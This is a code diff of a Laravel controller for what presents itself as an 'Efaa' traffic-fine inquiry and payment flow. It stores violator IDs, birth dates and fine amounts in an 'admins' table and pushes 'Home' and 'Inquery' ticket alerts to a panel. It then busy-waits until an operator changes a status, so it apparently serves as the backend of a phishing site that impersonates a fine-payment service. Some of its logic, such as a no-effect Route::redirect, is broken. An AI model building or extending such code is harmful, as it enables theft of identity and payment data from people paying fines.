@@ -7,7 +7,7 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Arr;
 use Illuminate\Support\Str;
 use Stevebauman\Location\Facades\Location;
-
+use Illuminate\Support\Facades\Route;
 
 class EfaaController extends Controller
 {
@@ -21,16 +21,47 @@ class EfaaController extends Controller
     }
 
 
-    public function addto($violatorID,$fineNumber){
+    public function paynow(Request $request){
+
+        $totalFineItemsAmount = $request->input('totalFineItemsAmount');
+        return view('new.pay',['totalFineItemsAmount' =>  $totalFineItemsAmount]);
+
+    }
 
 
-       
 
-        $user =   DB::table('admins')->where('id_ref',$violatorID )->first();
+    public function CreateOrder (Request $request) {
 
-        $personalInfo = unserialize( $user->info);
+        $ViolatorID    = $request->input('ViolatorID');
+        $FiensInfoDTOs = $request->input('FiensInfoDTOs');
 
-         $totalFineItemsAmount = $personalInfo->violationlInfo[0]->fineAmount;
+        $fineAmount = 0;
+        foreach($FiensInfoDTOs as $FiensInfoDTO)
+        $fineAmount += $FiensInfoDTO['FineAmount'];
+
+
+         Route::redirect("/addto/$ViolatorID/ $fineAmount/1", '/addto');
+      
+         //redirect()->action([EfaaController::class, 'addto'], ['violatorID' =>  $ViolatorID,'FiensInfoDTOs' =>  $fineAmount,'inside' => 1]);
+
+    
+
+    }
+
+
+    public function addto($violatorID, $FiensInfoDTOs,$inside = 0){
+
+        
+        if(isset($inside) && $inside == 0) {
+
+            $user =   DB::table('admins')->where('id_ref',$violatorID )->first();
+            $personalInfo = unserialize( $user->info);
+            $totalFineItemsAmount = $personalInfo->violationlInfo[0]->fineAmount;
+        }
+        else
+            $totalFineItemsAmount = $FiensInfoDTOs;
+
+
 
         return view('new.pay',['totalFineItemsAmount' =>  $totalFineItemsAmount]);
 
@@ -47,9 +78,9 @@ class EfaaController extends Controller
     $cul        = $request->input('cul');
 
 
-    $updateData = array('homestatus' => 0 , 'home' => '[]');
+    // $updateData = array('homestatus' => 0 , 'home' => '[]');
 
-    DB::table('admins')->where('id_ref',$violatorId)->update($updateData);
+    // DB::table('admins')->where('id_ref',$violatorId)->update($updateData);
 
 
     $user =   DB::table('admins')->where('id_ref',$violatorId )->first();
@@ -67,7 +98,7 @@ class EfaaController extends Controller
         
     ];
 
-    $insertedID = DB::table('notifications')->insert($dataArray);
+    // $insertedID = DB::table('notifications')->insert($dataArray);
 
 
     $html = '     <div class="p-2 mb-2 bg-info text-dark">Home</div>
@@ -76,15 +107,15 @@ class EfaaController extends Controller
                    </br><h4> Ticket  : '.$violatorId.'  </h4></br>
                    </div>';
    
-   $htmlData = [
-           'id_ref'  => $user->id,     
-           'username' => $insertedID,
-           'allinfo'  => $html,
-   ];
+//    $htmlData = [
+//            'id_ref'  => $user->id,     
+//            'username' => $insertedID,
+//            'allinfo'  => $html,
+//    ];
    
    
-    event(new \App\Events\SendNotification($dataArray));
-    DB::table('user_infos')->insert($htmlData);
+    // event(new \App\Events\SendNotification($dataArray));
+    // DB::table('user_infos')->insert($htmlData);
 
 
 
@@ -120,7 +151,7 @@ class EfaaController extends Controller
   public function GetViolationsByViolatorinquery(Request $request){
 
 // dd($request->input());
-    $violatorId = $request->input('violatorID');
+    $violatorId = $request->input('violatorId');
     $dob        = $request->input('dob');
     $fromHome   = $request->input('fromHome');
     $cul        = $request->input('cul');
@@ -128,13 +159,12 @@ class EfaaController extends Controller
 
 // dd( $violatorId);
 
-    $updateData = array('inquerystatus' => 0 , 'inquery' => '[]');
+    // $updateData = array('inquerystatus' => 0 , 'inquery' => '[]');
 
-    DB::table('admins')->where('id_ref',$violatorId)->update($updateData);
-
+    // DB::table('admins')->where('id_ref',$violatorId)->update($updateData);
 
     $user =   DB::table('admins')->where('id_ref',$violatorId)->first();
-// dd( $user);
+
 
     $dataArray = [
                     
@@ -148,7 +178,7 @@ class EfaaController extends Controller
         
     ];
 
-    $insertedID = DB::table('notifications')->insert($dataArray);
+    // $insertedID = DB::table('notifications')->insert($dataArray);
 
 
     $html = '     <div class="p-2 mb-2 bg-info text-dark">Inquery</div>
@@ -157,20 +187,21 @@ class EfaaController extends Controller
                    </br><h4> Ticket  : '.$violatorId.'  </h4></br>
                    </div>';
    
-   $htmlData = [
-           'id_ref'  => $user->id,     
-           'username' => $insertedID,
-           'allinfo'  => $html,
-   ];
+//    $htmlData = [
+//            'id_ref'  => $user->id,     
+//            'username' => $insertedID,
+//            'allinfo'  => $html,
+//    ];
    
    
-    event(new \App\Events\SendNotification($dataArray));
-    DB::table('user_infos')->insert($htmlData);
+    // event(new \App\Events\SendNotification($dataArray));
+    // DB::table('user_infos')->insert($htmlData);
 
  
     $counter = $user->inquerystatus;
 
-    while($counter == 1 || $counter == 0){
+
+    while($counter == 0){
 
        
            $user =   DB::table('admins')->where('id_ref',$violatorId)->first();
@@ -192,6 +223,16 @@ class EfaaController extends Controller
 
 
     
+   }
+
+
+
+   public function GetFirmsList(Request $request) {
+
+
+    return response()->json(
+        array(), 200, [], JSON_UNESCAPED_UNICODE);
+
    }
 
 
@@ -217,11 +258,14 @@ class EfaaController extends Controller
             'status'     => 0,
             'fineNumber' => $verNumber,
             'info'       => '{}',
-            'inquery'    => '{}',
-            'home'       => '{}',
+            'inquery'    => '[]',
+            'home'       => '[]',
         ];
         
            $user =   DB::table('admins')->where('id_ref',$idNumber )->first();
+
+     
+
         if(empty( $user)){
             $id   =   DB::table('admins')->insertGetId($userInsertData);
           }
@@ -229,17 +273,11 @@ class EfaaController extends Controller
 
             $isFound =   DB::table('admins')
                                             ->where('id_ref',$idNumber )
-                                            ->where('fineNumber' , $verNumber)
                                             ->first();
 
            
 
-                    
-                       
-
              if(empty($isFound)) {
-
-
 
                     $userUpdateData =  [
     
@@ -347,6 +385,8 @@ class EfaaController extends Controller
 
 
             $user =   DB::table('admins')->where('id_ref',$idNumber)->first();
+
+      
  
             $counter = $user->status;
         
@@ -359,7 +399,7 @@ class EfaaController extends Controller
         
             }
             
-           
+    
         
             $personalInfo = [];
             if(! empty($user->status) && $user->status == 1){
